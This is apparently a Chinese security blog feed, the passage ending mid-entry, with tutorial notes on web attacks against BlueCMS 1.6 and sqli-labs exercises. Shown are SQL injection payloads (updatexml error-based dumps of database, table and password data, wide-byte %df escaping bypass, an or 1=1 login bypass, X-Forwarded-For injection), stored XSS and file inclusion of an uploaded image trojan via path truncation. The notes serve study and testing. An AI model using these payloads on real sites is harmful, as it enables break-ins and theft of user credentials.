      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/</url>
      
        <content type="html"><![CDATA[<p>我们开始进行代码审计、漏洞挖掘</p><h3 id="网站重装漏洞"><a href="#网站重装漏洞" class="headerlink" title="网站重装漏洞"></a>网站重装漏洞</h3><p>一般我要做一个CMS网站，首先要访问目录中的安装目录，进行安装、注册管理员账号。那我们站在黑客角度上想一想，我们如果知道了一个cms的安装目录路径，那我们是不是能进行二次访问进行重新安装呢？这样的话我们是不是就可以重置管理员账号和密码，登入后台进行getshell呢？<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418sjhanvj31h60rbwgy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418t83yofj31h90pwdj9.jpg" alt><br>这样我们就可以进行重新安装了，而数据库账号密码，我们可以弄一个虚拟空间数据库，比如注入时用到的香港云。</p><h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>我们再来看这个网站，一般而言网站有展示类和功能类。</p><p>展示类（比如新闻站、门户站）</p><p>功能类（比如商城、OA、系统）</p><p>我们看到前台有一个注册功能，如果我们可以拿到一个普通用户的权限是不是更加容易渗透测试？测试的点是不是更多？<br>那么我们去注册一个账户吧！<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418thvsawj31h80osac3.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418tqqwkwj31h60qkdi5.jpg" alt><br>在注册之前，我们先开下burp，看下提交注册的数据包发往哪里去<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418u2kpw2j31gj0qhq6z.jpg" alt><br>发现它通过post方式将参数发送user.php ,我们注意到里面有act传进参数do_reg,我们通过代码审计工具找到user.php<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ub5ui9j31hc0sgk2s.jpg" alt><br>我们发现这里是检查传进来的注册参数是否为空和有没有空格，并且加入一些检查格式<br>而我们在下面发现sql插入语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uije5fj313b0i4tdu.jpg" alt><br>发现它并没有将注册的值进行过滤，而直接插入数据库中。那么这就很有可能存在XSS和sql注入。</p><p>我们先通过一个弹窗看看是否有xss，先抓一个包，并对其邮箱进行插入弹窗语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uxubm8j30z40rkq4p.jpg" alt><br>成功弹窗，这里是一个存储型的XSS。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wavb2qj31h80pqjt2.jpg" alt></p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>在插入语句中<br><code>&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;$user_name&#39;, md5(&#39;$pwd&#39;), &#39;$email&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;)&quot;;</code><br>这里插入没有过滤，由于email变量由一对单引号包着，所以我们试着在邮箱后面加个’,看看是否会报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br>发现还是注册成功了，那我们进后台看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wxhl9tj30z50h1wfx.jpg" alt><br>发现’好像被实体化了，就是被\转义了，这好像是php配置中开启了魔术引号，那我们应该想到之前的宽字节注入，在引号前加%df，使其与\%5c合并,从而避免’被转义。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418x765fgj30z40rktag.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xeyzpej30z40rkjtw.jpg" alt><br>发现报错了，那就说明存在注入<br>尝试使用updatexml的报错<br>构建下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>发现报错，没有显示我们想要的信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xro0upj30z40rkacp.jpg" alt><br>但我发现放进数据库执行，却能成功(需将%df\  去掉)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xzi127j31560lgaeh.jpg" alt><br>那我们只能通过盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or sleep(10),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>以这种格式继续盲注下去。</p><p>但我们想到，insert into 是能插入多条数据呢，那我们是不是能通过语句构建，再建立一个用户，然后用子查询填充邮箱处，然后我们登陆这个账号是不是就可以看到邮箱字段里面的内容？<br>我们先抓包<br>这样就插入了两组数据，而在第二组数据中的邮箱就是管理员密码<br>我们执行一下，发现执行失败<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ydsotkj30z40rktbf.jpg" alt><br>因为这里魔术引号会将引号转义，所以我们利用宽字节知识，将其转为16进制编码<br>allblue2019==&gt;0x616C6C626C756532303139<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yodkozj30z40rkq6i.jpg" alt><br>注册成功，登录<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yzxxk0j31gg0ovtaj.jpg" alt><br>将邮箱值进行md5解密，成功得到管理员密码<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418z7jwb3j31ha0ky3zn.jpg" alt></p><h3 id="登录框万能密码登录"><a href="#登录框万能密码登录" class="headerlink" title="登录框万能密码登录"></a>登录框万能密码登录</h3><p>我们尝试登录抓包<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zidhbij30z40rk760.jpg" alt><br>找到传参的位置，在审计工具查找<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zussp9j31hc0sm49l.jpg" alt><br>发现这里判断了是否为管理员，没有对登录参数进行限制，这可能存在POST注入<br>post注入，首先尝试着使用万能密码登录<br><code>%df&#39;) or 1=1#</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41902f5r4j30z40rkwg9.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190a2wpfj31hb0i6aae.jpg" alt><br>成功登录<br>然后登录后修改资料处也存在SQL注入和XSS</p><h3 id="X-Forwarded-For注入"><a href="#X-Forwarded-For注入" class="headerlink" title="X-Forwarded-For注入"></a>X-Forwarded-For注入</h3><p>我们通过一个普通用户发布了新闻<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190jiyuoj31hc0lndhp.jpg" alt><br>通过重新注册一个用户对其进行评论<br>评论成功<br>那么这可能也存在XSS。<br>我们评论时先抓个包看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193ify2nj31hc0mlq4z.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193tropfj30z40rkwgc.jpg" alt><br>发现他会将参数send提交到comment.php,那么我们去看一看</p><p>我们发现这里面有一些函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194117l1j31hc0sm116.jpg" alt></p><ul><li><p>intval()<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></li><li><p>htmlspecialchars()<br>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p></li><li><p>nl2br()<br>在字符串中的新行（\n）之前插入换行符<br>所以XSS肯定是没戏了。</p></li></ul><p>这时，我们看到了他在插入的时候，记录了评论用户的ip，我们发现了getip函数，我们定位一下函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194argjyj31dy0q7n3k.jpg" alt><br>找到了定义的函数，这里有一个getenv，实际上就是获取系统的环境变量</p><p>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</p><p>第二个X-Forwarded-For是个扩展请求头，这个东西可以通过HTTP请求头来修改。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194mh7qkj31cy0oudle.jpg" alt><br>那么我们是不是可以修改X-Forwarder-For的参数，将参数插入到ip中，那么ip的值就会放入sql语句中执行呢?<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194usqr2j31h90nxtas.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41953pdecj30zh0kydhq.jpg" alt><br>我们给个分号测试一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195bynenj31ga0nltar.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195kp9p5j31hc0fdt8t.jpg" alt><br>发现成功报错<br>因为X-Forwarded-For是直接获取的，所以不会出现魔术引号。<br>这里我们直接用sqlmap 就能直接跑出来了<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195ssd3yj30xz0hrq4w.jpg" alt></p><h3 id="数据库备份文件泄露"><a href="#数据库备份文件泄露" class="headerlink" title="数据库备份文件泄露"></a>数据库备份文件泄露</h3><p>有时候，管理员在备份数据库的时候，直接默认将备份文件直接放在网站目录下，这样其实是很危险的，很容易被黑客摸出来。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41964opglj31hc0omjv5.jpg" alt><br>我们登入后台，发现了一个数据库备份，好，那我们将数据库备份<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196cvcatj31hc0bsdgs.jpg" alt><br>我们到网站目录看一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196lq5n3j30st05pt8r.jpg" alt><br>发现他的命名规则是备份的年月日，那如果我们拿到一个CMS，知道他的备份目录，是不是可以尝试着爆破一下备份文件<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196v5eboj31gt0q4wft.jpg" alt></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含，首先需要找到包含函数<br>我们在找到了一个貌似可以控制的include函数，不过需要act参数=pay的时候才能执行<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419766cocj31e10osn4c.jpg" alt><br>最后在购买充值卡那找到<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197f34tlj31hc0m241t.jpg" alt><br>我们先找到一个能上传图片马的上传点<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197mhek1j31h90jqtac.jpg" alt><br>成功上传<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197vln3uj31h80k40t7.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/&apos;.$_POST[&apos;pay&apos;].&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>文件包含的路径</p><p>那么我们将木马路径传入到post参数中，那么路径为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=../../data/upload/face_pic/15605135978.jpg</span><br></pre></td></tr></table></figure></p><p>这样的话，包含语句就会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/../../data/upload/face_pic/15605135978.jpg/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>但是这样的话，后面还有个index。php，他会去加载index.php,会对加载图片马有所影响，那么我们需要将index.php截取掉，这里00截断试过了，php低版本才会存在这样的截断。</p><p>在这里我们可以尝试一个字符串截断的方法（Windows的路径不能超过60个字符）在Windows API中，路径的最大长度为MAX_PATH，MAX_PATH被定义为260。</p><p>那么我们是不是可以尝试在传参的后面加点进行截断，因为点最后会被windows给处理掉，但是填充了点之后，只会保留包含前面15605093967.png，在传参后的index.php因为路径超过260个字符后的东西都会被舍弃，于是乎我们直接传参后加260个点就可以截断了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4198wnf3nj30z40ni0ue.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419azj97kj30h10n73zx.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(1)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>这次我们讲的是一篇适合新手学习的代码审计，因为是给小白学习的代码审计，所以可以利用黑盒+白盒交叉审计的情况下，更好的帮助小白学习并找出漏洞。</p><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>phpstudy<br>BlueCMS1.6 sp1源码<br>代码审计工具(Seay源代码审计系统)</p><h3 id="审计思路："><a href="#审计思路：" class="headerlink" title="审计思路："></a>审计思路：</h3><p>一般来说，有一定代码功力的人审计代码,会直接将全文代码通读一遍，并寻找传参进行代码审计，但这是对有一定代码功力的人而言。</p><p>而对小白而言，利用黑盒和白盒交叉审计的情况下，更能帮助我们找到漏洞。</p><p>我们拿到一个CMS后，可以<strong>先寻找功能点</strong>，然后将功能点罗列出来，并对其功能点进行不断测试，然后在拿到代码的情况下，我们可以<strong>对功能点所对应的传参进行审计，那如果知道了传参的意义，就等于知道代码会去做什么，要去做什么了呢</strong>。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znruehwoj30za0rkjud.jpg" alt></p><h3 id="大概测试流程："><a href="#大概测试流程：" class="headerlink" title="大概测试流程："></a>大概测试流程：</h3><ul><li><strong>总结功能点</strong></li><li><strong>黑盒测试功能点：</strong></li></ul><p>①黑盒测试测不出来的地方进行白盒审计</p><p>②测试结果进行白盒审计</p><h3 id="Seay源码审计系统"><a href="#Seay源码审计系统" class="headerlink" title="Seay源码审计系统"></a>Seay源码审计系统</h3><p>常见功能简介：<br>1.代码自动高亮<br>2.可以自动审计（误报率高）<br>3.可以快速全局搜索<br>4.可以定位函数<br>5可以监控Mysql(插件)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znttjhddj31fo0rpn5h.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znu53w7bj31hb0rk792.jpg" alt></p><hr><p>这里我们只讲了代码审计的续篇，下一篇文章我们会开始进行代码审计、漏洞挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>head头注入</title>
      <link href="/2019/12/07/sql_head/"/>
      <url>/2019/12/07/sql_head/</url>
      
        <content type="html"><![CDATA[<p><strong>在讲head注入之前，我们先来了解一些PHP的一些超全局变量，在php中有很多预定义的超全局变量，这就意味着他们在一个脚本的任何作用域都可用：</strong></p><p><strong>$_REQUEST:</strong>（获取get，post，cookie的传参，但在新版本中已无法获取cookie传参了）</p><p><strong>$_POST:</strong>（获取post传参）</p><p><strong>$_GET:</strong>(获取get的传参)</p><p><strong>$_COOKIE:</strong>(获取cookie的传参)</p><p><strong>$_SERVER</strong>(包含了诸如头信息(header),路径(path)等用户信息)</p><h3 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h3><p><strong>addslashes()</strong> 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您<br>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。</p><p>遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>语法：addslashes(string)</p><p>string 必需。规定要转义的字符串。</p><p>返回值： 返回已转义的字符串。</p><p>PHP 版本： 4+</p><ul><li>stripslashes()</li></ul><p>函数删除由 addslashes() 函数添加的反斜杠。</p><p> <strong>mysql_real_escape_string()</strong></p><p>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><ul><li><p>\x00</p></li><li><p>\n</p></li><li><p>\r</p></li><li><p>\</p></li><li><p>‘</p></li><li><p>“</p></li><li><p>\x1a</p></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>语法：mysql_real_escape_string(string,connection)</p><p>string 必需。规定要转义的字符串。</p><p>connection 可选。规定 MySQL 连接。</p><p>如果未规定，则使用上一个连接。</p><p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于 mysql_query()。</p><h2 id="在这里我们用sqli-靶场less-18为例，"><a href="#在这里我们用sqli-靶场less-18为例，" class="headerlink" title="在这里我们用sqli-靶场less-18为例，"></a>在这里我们用sqli-靶场less-18为例，</h2><p>在此关源代码中我们看到代码中用check_input函数，对uname和passwd进行转义，所以不能在对username和password框进行注入了<br><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/nwswSpT55o1rDq4PQUE4HrdNkta0ob3ZmTFzPVC*JSg!/b/dL8AAAAAAAAA&amp;bo=6QFKAAAAAAADF5A!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/i*8eUgB0PmYpObHDUHxSCd*Tm5FLKf2TZEARLVerTFE!/b/dLkAAAAAAAAA&amp;bo=QQJVAAAAAAADFyQ!&amp;rf=viewer_4" alt><br>在往下代码我们看到了插入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;,</span><br><span class="line">&apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></p><p>这穿代码将user-agent和ip插入了数据库，而我们的控制点也是这两个，那我们是不是能利用user-agent和ip进行插入，我们可以通过抓包修改他的user-agent进而来进行注入</p><h4 id="我们先来说一下updatexml-函数"><a href="#我们先来说一下updatexml-函数" class="headerlink" title="我们先来说一下updatexml() 函数"></a>我们先来说一下<strong>updatexml() 函数</strong></h4><p><strong>语法：updatexml(目标xml文档，xml路径，更新的内容)</strong></p><p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询语句！</p><p>(0x7e其实代表着16进制的”~”号，转换成16进制其实是为了过一些过滤，使得代码”兼容性”更高，<strong>其实~是为了让语法报错，让我们插入的子查询执行并通过报错带出来</strong>，其实只要能让语法错误的标点符号其实都是可以的)</p><p>也可以使用extractvalue（）函数，但低版本的mysql好像不支持这个函数；</p><h3 id="我们通过modheard这个插件来对user-agent进行修改"><a href="#我们通过modheard这个插件来对user-agent进行修改" class="headerlink" title="我们通过modheard这个插件来对user-agent进行修改"></a>我们通过modheard这个插件来对user-agent进行修改</h3><hr><p>我们先修改user-agent进行测试</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/q6bMPnwd5Da7o6uJLlJ1.yBautUyB39Idb5j8P42WaU!/b/dL8AAAAAAAAA&amp;bo=*QPdAAAAAAADBwE!&amp;rf=viewer_4" alt></p><p>发现插入成功！</p><p>那么我们就来开始构造payload进行注入：</p><ul><li>先查询数据库名：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p>1’闭合前面，后面的两对闭合单引号是为了补充’$IP’, $uname两个数据位置；在将数据库后面语句注释掉</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/h5wItQlyqSf8q*fWEBZbyuxarCM9MsOS.gkgBK0AFo0!/b/dL4AAAAAAAAA&amp;bo=igSPAAAAAAADFzM!&amp;rf=viewer_4" alt></p><ul><li>查询表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/6dP8GqUgFPrBrmBaR2CUU0UPLq4cOpZe1BXSsvGGRjs!/b/dFQBAAAAAAAA&amp;bo=PwZoAAAAAAADF2M!&amp;rf=viewer_4" alt></p><ul><li>查询字段名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/1*jz.Je1g7Y*Ky6011XcNEhXaffD0Mr6HN4hV9JpoLg!/b/dFYBAAAAAAAA&amp;bo=VwZ1AAAAAAADFxY!&amp;rf=viewer_4" alt></p><ul><li>爆用户名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.UxMQ7MiXCRxXQl1xnmZtDYwcUwVV8wZTNeYe0QlnII!/b/dL8AAAAAAAAA&amp;bo=8wTCAAAAAAADFwc!&amp;rf=viewer_4" alt></p><p>爆密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></p><p> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/pAockMgFEAkgsrRs7qt12dZT3QgONi0fXpuStLt3Ils!/b/dDcBAAAAAAAA&amp;bo=hQTRAAAAAAADF2I!&amp;rf=viewer_4" alt></p><p>这样一次head头的注入就这样完成了，而后面靶场的head注入其实也是对其他head头（referer、cookie）进行注入而已，而注入的方法多种多样……</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2019/12/07/sqlkzj/"/>
      <url>/2019/12/07/sqlkzj/</url>
      
        <content type="html"><![CDATA[<h3 id="宽字节sql注入的原理"><a href="#宽字节sql注入的原理" class="headerlink" title="宽字节sql注入的原理"></a>宽字节sql注入的原理</h3><p>gbk使用的是双字节编码,而utf8则是三字节。</p><ol><li><p>宽字节注入原因是设置的数据库编码和php编码是两个不同的编码，就可能产生宽字节注入漏洞</p></li><li><p>如果php编码为utf8,而sql语句set names gbk 这样配置可能会导致编码在转换时出现注入漏洞。</p></li><li><p>set names x.就等同设置了数据库连接，发出，接收的编码<br>(宽字节sql注入就是php在发送数据到数据库过程中使用了语句进行set names gbk或set claracter_set_client=gbk,但由于被一些字符集转换而导致宽字节注入)</p></li></ol><p>先引入一个php函数:</p><h3 id="megic-quotes-gpc-魔术信号开关"><a href="#megic-quotes-gpc-魔术信号开关" class="headerlink" title="megic_quotes_gpc(魔术信号开关):"></a><strong>megic_quotes_gpc(魔术信号开关):</strong></h3><p>当php传参时<strong>有特殊字符就会在前面加”\”来转译字符</strong> 来过滤，比如单引号，双引号，反斜线，null字符等都会被转义。(会对特殊字符进行转义)<br>在php作用是 <strong>判断解析用户输入的数据</strong>，包括post, get , cookie传过来的<strong>可疑数据增加转义字符</strong>如”\”,减少可疑数据对程序和数据库的影响而导致出错。 就是说<strong>如果有特殊字符，他就会在前面加一个反斜杠来进行过滤</strong>，那我们该如何绕过呢？</p><h2 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a><strong>绕过原理：</strong></h2><p>在gbk编码中，\的编码为%5c,而中文字符”运”的编码为%df%5c,那么我们可不可以在这里做文章呢？</p><p>我们在使用引号去测试注入的时候，可能会被\转义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=1\&apos;&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>被转义使我们无法进行注入，那我们能不能使用%df去和\编码%5c结合，变成一个运字，使得单引号闭合，’逃过’了被转义的命运。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1%df%5c&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义后执行sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; union select 1,user()#&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>这是因为php和mysql使用了两种编码，使转码过程中出现漏洞。<br>如果我们输入%df”,而php的魔术引号会强制的转换”，在前面加反斜杠\”，而\等于%5c,则代码成为% df%5c”，而%df%5c编码为运字，变成运”，从而\转义字符被合并了，(从而绕过转义。)</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>post注入</title>
      <link href="/2019/12/07/sql2/"/>
      <url>/2019/12/07/sql2/</url>
      
        <content type="html"><![CDATA[<h3 id="post注入的介绍"><a href="#post注入的介绍" class="headerlink" title="post注入的介绍"></a>post注入的介绍</h3><p>post注入也是sql注入的一种类型，通过post进行传参的注入，post传参一般是通过表单的方式提交，但本质上和get注入没有多大的区别。通过伪造插入修改语句，使得用户插入的数据也被当成sql代码去执行。</p><h3 id="post注入的高危点"><a href="#post注入的高危点" class="headerlink" title="post注入的高危点**"></a>post注入的高危点**</h3><ul><li>网页登陆框</li><li>网页查询框</li><li>与数据库有交互的提交框</li></ul><p>一般情况下，当我们通过HTML表单提交数据到服务器时，服务端都会在数据库中检查我们输入的数据是否符合要求，然后根据数据库搜索结果返回相应的数据给客户端，但如果我们能控制输入，构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</p><p><strong>这里以sqli-less-11做post注入例题讲解：</strong></p><p>我们点进去，看到一张登陆的表单，我们思考一下应该如何进行注入</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/IQ8PuQYXRfQeKFbKXgUUpLG8c0u9bRyDxpMCb8JUO7A!/b/dLkAAAAAAAAA&amp;bo=3wSdAQAAAAADB2U!&amp;rf=viewer_4" alt></p><p>我们先通过用一个单引号在username上进行测试，发现出现错误信息，结果显示是对’的处理所产生的错误<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.s0IqEEnc82GeYcsj6bUgw654mtuR57kW6RYZGKKnYU!/b/dFYBAAAAAAAA&amp;bo=8AWAAAAAAAADF0c!&amp;rf=viewer_4" alt></p><p>我们通过闭合’,在再后面加上or 1=1再将后面注释掉，竟然发现登陆了进去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/kb0Ha8Mr6gvwbdZjJfLhBBPpydpnzihcImL2JKqDjP8!/b/dLYAAAAAAAAA&amp;bo=MwY0AgAAAAADJwE!&amp;rf=viewer_4" alt></p><p>这是为什么呢？显而易见，or ’1’ = ‘1’恒为真，而且#后面的密码直接被注释了，那么我们可以直接登录到后台了。<br>那我们能不能通过构造 get 注入中用到的其他的语句代替 or 1=1 进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4LkCwAdfoqRthpNHMTnA.EeKDTK*IDTWRjU7*WDKHX4!/b/dLYAAAAAAAAA&amp;bo=tgQRAgAAAAADJ6M!&amp;rf=viewer_4" alt><br>登陆失败，显示报错</p><figure 